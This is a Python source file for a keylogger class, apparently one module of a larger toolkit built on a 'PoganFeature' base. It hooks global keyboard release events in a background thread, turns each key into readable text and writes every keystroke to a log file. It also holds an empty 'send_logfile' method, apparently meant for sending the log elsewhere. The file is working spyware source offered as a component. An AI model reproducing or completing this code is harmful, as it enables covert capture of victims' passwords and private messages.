from string import ascii_letters, digits
from threading import Thread, Semaphore
from keyboard import on_release

from pogan_feature import PoganFeature


class KeyLogger(PoganFeature):
    def __init__(self, filename: str, log_dir: str):
        super().__init__("", filename, log_dir)

        self.alphabet = ascii_letters + digits + '!@#$%^&*()-+{}[]\';:\"<>/\\~`'
        self.semaphore = Semaphore(0)
        self.runner_thread = Thread(target=self.capture_keys)

    def run(self):
        self.runner_thread.start()

    def clean(self):
        self.send_logfile()
        self.runner_thread.join()

    def capture_keys(self):
        on_release(callback=self.on_keypress)
        self.semaphore.acquire()

    def on_keypress(self, event):
        name = event.name

        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[enter]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.logger.write(name)

    def send_logfile(self):
        pass
